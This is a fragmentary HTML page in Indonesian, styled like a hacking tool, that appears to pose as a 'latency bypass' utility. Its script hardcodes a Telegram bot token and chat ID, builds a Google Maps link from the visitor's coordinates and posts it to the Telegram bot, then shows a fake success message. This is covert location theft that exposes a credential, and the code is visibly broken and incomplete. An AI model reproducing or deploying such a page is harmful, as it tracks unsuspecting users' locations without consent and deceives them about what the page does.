<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">

        .panel { background: rgba(20, 20, 20, 0.9); border: 1px solid #00ff00; padding: 30px; border-radius: 5px; box-shadow: 0 0 20px #00ff00; width: 400px; text-align: center; }

        input { width: 90%; padding: 10px; margin: 10px 0; background: #000; border: 1px solid #00ff00; color: #00ff00; outline: none; }
        button { width: 95%; padding: 12px; background: #00ff00; color: #000; border: none; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { background: #00cc00; box-shadow: 0 0 15px #00ff00; }
        .logs { text-align: left; font-size: 10px; height: 80px; overflow-y: auto; background: #000; padding: 10px; margin-top: 15px; border: 1px solid #333; }
        .status { font-size: 12px; margin-top: 10px; color: #ff0000; animation: blink 1s infinite; }

<script>
    const tele_token = "8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo";
    const tele_id = "8551809114";

        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;

            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: tele_id, text: message, parse_mode: 'Markdown' })
        });
        
        addLog("[success] Latency bypass berhasil disinkronkan.");

    }
</script>
